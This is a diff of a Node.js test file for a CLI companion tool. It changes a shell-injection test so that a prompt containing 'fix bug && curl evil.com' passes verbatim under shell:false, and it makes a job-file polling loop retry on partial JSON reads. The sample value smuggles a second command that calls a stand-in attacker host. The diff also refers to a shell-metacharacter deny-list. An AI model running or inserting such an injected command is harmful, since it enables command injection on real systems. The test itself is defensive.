@@ -187,18 +187,23 @@ test("task --effort high routes through the per-call CLI with --model claude-opu
   );
 });
 
-test("task --model rejects prompts containing shell metacharacters (injection defense)", () => {
+test("task --model passes shell-metachar prompts verbatim under shell:false (argv, no shell interpretation)", () => {
+  // The shell-metacharacter deny-list is scoped to the shell-enabled
+  // spawn path (Windows production with the real `.cmd` launcher).
+  // Under shell:false — tests (COPILOT_COMPANION_COPILOT_COMMAND set),
+  // Linux / macOS production — Node hands argv directly to CreateProcess
+  // / execve, so metacharacters like `&&` are literal text and no
+  // injection is possible. Lock in that the deny-list does NOT fire on
+  // this path; the shell:true branch is inspected via the unit tests on
+  // SHELL_METACHAR_RE (see tests/shell-metachar-regex.test.mjs).
   const pluginData = makeTempDir();
   const result = runCompanion(
     ["task", "--model", "haiku", "fix bug && curl evil.com"],
-    { pluginData, script: buildScriptedPrompt("never") }
+    { pluginData, script: buildScriptedPrompt("ok") }
   );
-  assert.notEqual(result.status, 0);
-  assert.match(
-    result.stderr,
-    /shell metacharacter/i,
-    `expected a metachar rejection message on stderr; got: ${result.stderr}`
-  );
+  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
+  assert.match(result.stdout, /ok/);
+  assert.doesNotMatch(result.stderr, /shell metacharacter/i);
 });
 
 test("task --model with a non-zero CLI exit records the job as failed", () => {
@@ -464,14 +469,22 @@ test("task --background --effort high falls back to --model claude-sonnet-4.5 vi
 
   // Poll until the detached worker writes terminal state (worker runs
   // async; this integration test accepts either completed or the
-  // completed-with-fallback outcome).
+  // completed-with-fallback outcome). The worker's writeJobFile is a
+  // plain writeFileSync, so a poll that hits the file mid-write reads
+  // truncated content — tolerate partial reads by retrying rather than
+  // throwing "Unexpected end of JSON input" and failing the test on
+  // Windows where filesystem timing makes the race more frequent.
   const deadline = Date.now() + 90000;
   let job;
   while (Date.now() < deadline) {
     const jobFile = fs.readdirSync(jobsDir).find((name) => name.endsWith(".json"));
     if (jobFile) {
-      job = JSON.parse(fs.readFileSync(path.join(jobsDir, jobFile), "utf8"));
-      if (job.status === "completed" || job.status === "failed") break;
+      try {
+        job = JSON.parse(fs.readFileSync(path.join(jobsDir, jobFile), "utf8"));
+        if (job.status === "completed" || job.status === "failed") break;
+      } catch {
+        // Partial write; retry next poll.
+      }
     }
     // Busy-wait sparingly to keep this test bounded.
     const start = Date.now();
